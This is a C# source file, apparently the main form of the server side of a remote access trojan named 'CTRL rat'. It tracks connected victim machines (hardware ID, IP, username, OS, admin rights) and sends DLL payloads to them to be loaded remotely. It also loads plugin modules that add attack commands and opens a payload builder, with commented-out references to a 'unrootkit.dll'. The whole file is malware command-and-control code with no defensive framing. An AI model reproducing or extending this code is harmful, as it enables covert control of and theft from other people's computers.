using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using CTRL_rat_Server.forms;

namespace CTRL_rat_Server
{
    public partial class Main : Form
    {
        public handlers handler = new handlers();
        public Listener listen = new Listener();
        public List<string> Created_dlls = new List<string>();
        public List<dynamic> activator = new List<dynamic>();
        public List<string> commands = new List<string>(); 
        public Main()
        {
            InitializeComponent();
            handler.OnClientClose = OnClose;
            handler.OnClientConnect = OnConnect;
            handler.OnClientMessage = Onmessage;
            listen.Onconnect = handler.Onconnect;
            listen.OnCompletedRequest = handler.Onmessage;
            listen.OnClose = handler.Onclose;
            listen.OnPartialRequest = handler.Onpartialmessage;
            OnFormLoad();
        }
        public void Send_and_load_dll(node client, byte[] dll) 
        {
            //add a timeout for dll loaded later
            Dictionary<object, object> payload = new Dictionary<object, object>();
            payload["op"] = "load_dll";
            payload["data"] = dll;
            string id = client.generate_random_id();
            payload["id"] = id;
            client.Send(client.sock, Encoding.UTF8.GetBytes(client.DictionaryToJson(payload)));
            while (!Created_dlls.Contains(id))
            {
                if (Created_dlls.Contains(id)) 
                {
                    break;
                }
            }
            //MessageBox.Show("done!");
            Created_dlls.Remove(id);
        }
        private void On_dll_message(node client, Dictionary<object, object> response) 
        {
            foreach (dynamic activ in activator)
            {
                var p = activ.GetType().GetMethod("OnMessage", BindingFlags.Instance | BindingFlags.Public);
                try
                {
                    p.Invoke(activ, new object[] { client, response });
                }
                catch
                {
                }
            }

        }
        private void On_dll_connect(node client, Dictionary<object, object> authresponse)
        {
            foreach (dynamic activ in activator)
            {
                var p = activ.GetType().GetMethod("OnConnect", BindingFlags.Instance | BindingFlags.Public);
                try
                {
                    p.Invoke(activ, new object[] { client, authresponse });
                }
                catch{}
            }

        }
        public void Onmessage(node client, Dictionary<object, object> response) 
        {
            var opcode = (string)response["op"];// == "pog") MessageBox.Show("ITWORKED!");
            switch (opcode) 
            {
                case "dll_loaded":
                    Created_dlls.Add((string)response["id"]);
                    break;
                default:
                    On_dll_message(client, response);
                    break;
            }
        }
        public void OnConnect(node client, Dictionary<object,object> response) 
        {
            Clients.Invoke((MethodInvoker)(() =>
            {
                try
                {
                    ListViewItem lvi = new ListViewItem();
                    lvi.Tag = client;
                    lvi.Text = client.hwid;
                    lvi.SubItems.Add(response["ip"].ToString());
                    lvi.SubItems.Add(response["username"].ToString());
                    lvi.SubItems.Add(response["os"].ToString());
                    lvi.SubItems.Add(response["admin"].ToString());
                    Clients.Items.Add(lvi);
                }
                catch (Exception e) { MessageBox.Show(e.ToString()); }
            }));
            On_dll_connect(client,response);
        }
        public void OnClose(node client)
        {
            try
            {
                Clients.Invoke((MethodInvoker)(() =>
                {
                    foreach (ListViewItem i in Clients.Items)
                    {
                        //i.Tag
                        if (i.Tag == client)
                        {
                            Clients.Items.Remove(i);
                            foreach (dynamic activ in activator)
                            {
                                var p = activ.GetType().GetMethod("OnClose", BindingFlags.Instance | BindingFlags.Public);
                                try
                                {
                                    p.Invoke(activ, new object[] { client });
                                }
                                catch { }
                            }
                            break;

                        }

                    }
                }));
            }
            catch { }
        }
        private void Clients_SelectedIndexChanged(object sender, EventArgs e)
        {

        }
        private void button1_Click(object sender, EventArgs e)
        {
            new Thread(delegate ()
            {
                var XForm = new settings(this);
                Application.Run(XForm);
            }).Start();
        }
        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            base.OnFormClosed(e);
            System.Diagnostics.Process.GetCurrentProcess().Kill();
        }
        public void click_handler(string command, node client) 
        {
            foreach (dynamic activ in activator) 
            {
                var p = activ.GetType().GetMethod("OnCommandClick", BindingFlags.Instance | BindingFlags.Public);
                try
                {
                    p.Invoke(activ, new object[] { command, client });
                }
                catch { }
            }
            /*var g = client.get_or_create_worker_node(client.generate_random_id());
            Send_and_load_dll(g, File.ReadAllBytes("unrootkit.dll"));
            g.dispose();
            var payload = new Dictionary<object, object>();
            payload["op"] = "this is meant for dll";
            payload["data"] = "pog";
            client.Send(client.sock, Encoding.UTF8.GetBytes(client.DictionaryToJson(payload)));*/
        }
        public void OnMenuClick(object sender, ToolStripItemClickedEventArgs e) 
        {
            node client = (node)((ContextMenuStrip)sender).Tag;
            string command = e.ClickedItem.Text;
            new Thread(() => click_handler(command,client)).Start();

            //Dictionary<object, object> response = new Dictionary<object, object>();
            //response["op"] = "testing";
            //response["data"] = File.ReadAllBytes("unrootkit.dll");//new byte[] { };
            Console.WriteLine(command);
            
        }
        private void Clients_MouseClick(object sender, MouseEventArgs e)
        {
            if (Clients.SelectedItems.Count != 0)
            {
                foreach (ListViewItem LItem in Clients.SelectedItems)
                {
                    LaunchContext((node)LItem.Tag);
                }
            }
        }
        private void LaunchContext(node client) 
        {
            ContextMenuStrip contexMenu = new ContextMenuStrip();
            contexMenu.Tag = client;
            foreach (string i in commands) 
            {
                contexMenu.Items.Add(i);
            }
            contexMenu.ItemClicked += new ToolStripItemClickedEventHandler(OnMenuClick);
            contexMenu.Show(Cursor.Position);
        }
        private void OnFormLoad()
        {
            Load_server_dll();
        }
        private void Load_server_dll() 
        {
            string dir = Path.Combine(Directory.GetCurrentDirectory(), "plugin\\Server");
            string[] files = Directory.GetFiles(dir);
            foreach (string file in files) 
            {
                if (!file.ToLower().EndsWith("dll")) continue;
                var o = Assembly.Load(File.ReadAllBytes(file));
                dynamic r = Activator.CreateInstance(o.GetType("CTRL_module.Main"));
                activator.Add(r);
                var p = r.GetType().GetMethod("Init", BindingFlags.Instance | BindingFlags.Public);
                p.Invoke(r, new object[] { this });
                foreach (string i in r.commands) 
                {
                    commands.Add(i);
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            new Thread(delegate ()
            {
                var XForm = new builder();
                Application.Run(XForm);
            }).Start();
        }
    }
}
